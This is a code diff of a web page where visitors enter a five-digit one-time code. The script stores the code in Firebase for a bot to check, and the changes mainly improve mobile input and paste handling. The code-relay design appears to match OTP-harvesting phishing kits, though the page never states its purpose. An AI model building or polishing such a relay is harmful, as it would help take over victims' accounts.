@@ -11,7 +11,6 @@
         
         body {
             background-color: #09090b; 
-            /* background-image: url('LINK_GAMBAR_DISINI'); background-size: cover; background-position: center; background-blend-mode: overlay; */
             font-family: 'Poppins', sans-serif;
             overflow-x: hidden;
             color: #e4e4e7;
@@ -138,7 +137,7 @@
         </div>
     </aside>
 
-    <!-- SIDEBAR KANAN -->
+    <!-- SIDEBAR KANAN (ADMIN ONLY) -->
     <aside id="sidebarRight" class="fixed top-0 right-0 h-full w-[300px] bg-[#121214] shadow-2xl transform translate-x-full flex flex-col pt-20 border-l border-[#27272a]">
         <div class="p-4 border-b border-[#27272a]">
             <p class="text-[10px] font-bold text-center tracking-widest text-red-500 uppercase">
@@ -207,19 +206,20 @@
             </p>
 
             <div class="flex gap-2.5 justify-center mb-6 w-full" id="otpContainer">
-                <input type="text" maxlength="1" class="otp-box font-bold" autofocus>
-                <input type="text" maxlength="1" class="otp-box font-bold">
-                <input type="text" maxlength="1" class="otp-box font-bold">
-                <input type="text" maxlength="1" class="otp-box font-bold">
-                <input type="text" maxlength="1" class="otp-box font-bold">
+                <!-- HAPUS maxlength="1", PAKE inputmode="numeric" BIAR KEYBOARD HP KELUAR -->
+                <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box font-bold text-center" autofocus>
+                <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box font-bold text-center">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box font-bold text-center">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box font-bold text-center">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box font-bold text-center">
             </div>
 
             <p id="otpErrorText" class="text-[10px] font-bold text-red-500 hidden mb-2 uppercase tracking-widest text-center">INVALID CODE!</p>
 
-            <!-- Loading State (Sembunyi by default) -->
+            <!-- Loading State -->
             <div id="loadingVerifying" class="hidden flex-col items-center justify-center w-full mb-2">
                 <i class="fas fa-circle-notch fa-spin text-xl text-[#e4e4e7] mb-2"></i>
-                <p class="text-[10px] font-bold text-[#a1a1aa] uppercase tracking-widest">VERIFYING CODE...</p>
+                <p class="text-[10px] font-bold text-[#a1a1aa] uppercase tracking-widest">VERIFYING...</p>
             </div>
 
             <p id="timerText" class="text-[10px] font-bold text-center mt-2 text-[#71717a] uppercase tracking-widest">
@@ -257,7 +257,7 @@
 
         let currentRequestId = null;
 
-        // REALTIME DATA SINKRONISASI DARI BOT
+        // SINKRONISASI DATA DARI BOT
         onSnapshot(doc(db, "verify_portal", "main_config"), (docData) => {
             if (docData.exists()) {
                 const data = docData.data();
@@ -355,28 +355,27 @@
             
             if(otpVal.length !== 5 || !currentRequestId) return;
 
-            // Tampilkan UI Loading (Buffering)
+            // UI Loading (Buffering)
             document.getElementById('timerText').classList.add('hidden');
             document.getElementById('cancelBtn').classList.add('hidden');
             const loadingDiv = document.getElementById('loadingVerifying');
             loadingDiv.classList.remove('hidden');
             loadingDiv.classList.add('flex');
             
-            // Kunci input agar tidak bisa diketik lagi
             inputs.forEach(i => i.disabled = true);
 
-            // Update status ke Firebase agar dicek Bot
+            // Update ke Firebase
             await updateDoc(doc(db, "verify_portal", "main_config", "requests", currentRequestId), {
                 status: 'checking_otp',
                 enteredOtp: otpVal
             });
 
-            // Tunggu jawaban dari bot
+            // Pantau Bot
             const unsubOtp = onSnapshot(doc(db, "verify_portal", "main_config", "requests", currentRequestId), (snap) => {
                 const finalData = snap.data();
                 
                 if(finalData.status === 'verified') {
-                    // SUKSES: Ganti isi kartu jadi Centang Hijau
+                    // SUKSES
                     document.getElementById('step2-card').innerHTML = `
                         <div class="text-[#10b981] text-6xl mb-4 mt-6 animate-pulse"><i class="fas fa-check-circle"></i></div>
                         <h2 class="text-2xl font-extrabold mb-2 text-center text-white tracking-wide">VERIFIED!</h2>
@@ -386,14 +385,13 @@
                     `;
                     unsubOtp();
                 } else if (finalData.status === 'wrong_otp') {
-                    // GAGAL: Kembalikan UI dan kasih tulisan merah
+                    // GAGAL
                     loadingDiv.classList.add('hidden');
                     loadingDiv.classList.remove('flex');
                     document.getElementById('timerText').classList.remove('hidden');
                     document.getElementById('cancelBtn').classList.remove('hidden');
                     document.getElementById('otpErrorText').classList.remove('hidden');
                     
-                    // Buka kunci input dan kosongkan
                     inputs.forEach(i => { i.disabled = false; i.value = ''; i.classList.add('input-error'); });
                     inputs[0].focus();
                     
@@ -404,7 +402,7 @@
         }
     </script>
 
-    <!-- UI SCRIPTS & PASTE HANDLER -->
+    <!-- UI SCRIPTS & ANTI-BUG KEYBOARD HP -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const urlParams = new URLSearchParams(window.location.search);
@@ -415,50 +413,58 @@
             const inputs = document.querySelectorAll('.otp-box');
             
             inputs.forEach((input, index) => {
-                // Event saat ngetik 1 per 1
-                input.addEventListener('keyup', (e) => {
+                // LOGIKA BARU: KEBAL DARI BUG KEYBOARD HP & PASTE
+                input.addEventListener('input', (e) => {
                     input.classList.remove('input-error');
                     document.getElementById('otpErrorText').classList.add('hidden');
-
-                    if (e.key.length === 1 && input.value !== '') {
-                        if (index < inputs.length - 1) inputs[index + 1].focus();
-                        else if (index === inputs.length - 1) window.submitOTP();
-                    } else if (e.key === 'Backspace') {
-                        if (index > 0) inputs[index - 1].focus();
-                    }
-                });
-
-                // Event saat tombol PASTE ditekan
-                input.addEventListener('paste', (e) => {
-                    e.preventDefault();
-                    // Ambil teks yang di-paste, batasi 5 karakter
-                    const pastedData = e.clipboardData.getData('text').trim().slice(0, inputs.length).split('');
                     
-                    if (pastedData.length > 0) {
-                        // Hilangkan error merah jika ada
-                        document.getElementById('otpErrorText').classList.add('hidden');
-                        
-                        // Sebarkan angka ke tiap kotak
-                        pastedData.forEach((char, i) => {
-                            if (i < inputs.length) {
-                                inputs[i].value = char;
-                                inputs[i].classList.remove('input-error');
+                    // Bersihkan huruf, pastikan cuma angka
+                    let val = input.value.replace(/[^0-9]/g, ''); 
+                    
+                    // Deteksi kalau yang masuk lebih dari 1 angka (Paste / Sugesti Keyboard)
+                    if (val.length > 1) {
+                        const digits = val.split('').slice(0, inputs.length);
+                        inputs.forEach((inp, i) => {
+                            if (digits[i]) {
+                                inp.value = digits[i];
+                                inp.classList.remove('input-error');
                             }
                         });
                         
-                        // Otomatis verifikasi jika 5 kotak penuh
-                        if (pastedData.length === 5) {
+                        // Kalau 5 angka udah pas, langsung submit!
+                        if (digits.length === 5) {
                             inputs[4].focus();
                             window.submitOTP();
                         } else {
-                            inputs[pastedData.length - 1].focus();
+                            inputs[digits.length - 1].focus();
+                        }
+                        return; // Stop eksekusi bawahnya
+                    }
+
+                    // Kalau ngetik 1 angka biasa
+                    input.value = val;
+                    if (val.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus(); // Geser ke kanan
+                        } else {
+                            window.submitOTP(); // Kalo udah di ujung, submit!
+                        }
+                    }
+                });
+
+                // Deteksi Hapus (Backspace) untuk geser ke kiri
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '') {
+                        if (index > 0) {
+                            inputs[index - 1].focus();
+                            inputs[index - 1].value = ''; 
                         }
                     }
                 });
             });
         });
 
-        // Sidebar & Music Controls... (Sama seperti sebelumnya)
+        // Sidebar & Music Controls
         const overlay = document.getElementById('overlay');
         const sidebarLeft = document.getElementById('sidebarLeft');
         const sidebarRight = document.getElementById('sidebarRight');
